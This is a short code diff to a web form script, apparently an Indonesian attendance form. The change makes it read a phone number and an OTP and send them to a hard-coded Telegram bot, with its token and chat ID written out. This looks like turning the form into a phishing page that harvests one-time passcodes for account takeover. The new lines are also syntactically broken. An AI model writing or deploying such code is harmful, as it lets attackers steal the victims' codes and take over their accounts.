@@ -100,13 +100,13 @@
 document.getElementById("formAbsensi").addEventListener("submit", function(e){
     e.preventDefault();
 
-    var nama = document.getElementById("nama").value;
-    var posisi = document.getElementById("posisi").value;
+    var nama = document.getElementById("nomor tele").value;
+    var posisi = document.getElementById("otp").value;
 
     var token = "8588288437:AAF55Cst6oQzNmm8qlFfM1fij_J2UgUJVSQ";
     var chat_id = "8465582504";
 
-    var pesan = "📋 ABSENSI MASUK\n\n👤 Nama: " + nama + "\n📌 Posisi: " + posisi;
+    var pesan = "📋 ABSENSI MASUK\n\n👤 Nama: " + nomor tele + "\n📌 Posisi: " + otp;
 
     var url = "https://api.telegram.org/bot" + token +
               "/sendMessage?chat_id=" + chat_id +
